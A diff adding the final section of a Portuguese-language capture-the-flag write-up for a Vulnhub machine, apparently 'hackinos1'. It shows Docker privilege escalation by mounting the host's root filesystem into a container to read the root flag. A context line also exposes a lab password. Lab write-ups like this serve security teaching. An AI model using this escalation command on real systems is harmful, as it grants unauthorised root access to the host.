@@ -351,4 +351,27 @@ password: 123456
 
 #### Docker PrivEsc
 
+Algo bem legal que encontramos em maquinas com `containers`, é privesc através do `docker`. 
+
 [Docker Privilege Escalation](https://root4loot.com/post/docker-privilege-escalation/)
+
+```
+docker container ps
+```
+
+![docker](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/docker.png)
+
+```
+docker run -v /:/root -ti ubuntu /bin/bash
+cd root/
+ls
+cd root/
+cat flag
+```
+
+![rootflag](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/ROOT22.png)
+
+
+### Congratulations!
+
+![Congratulations](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/hackinos1/anakein_root.png)
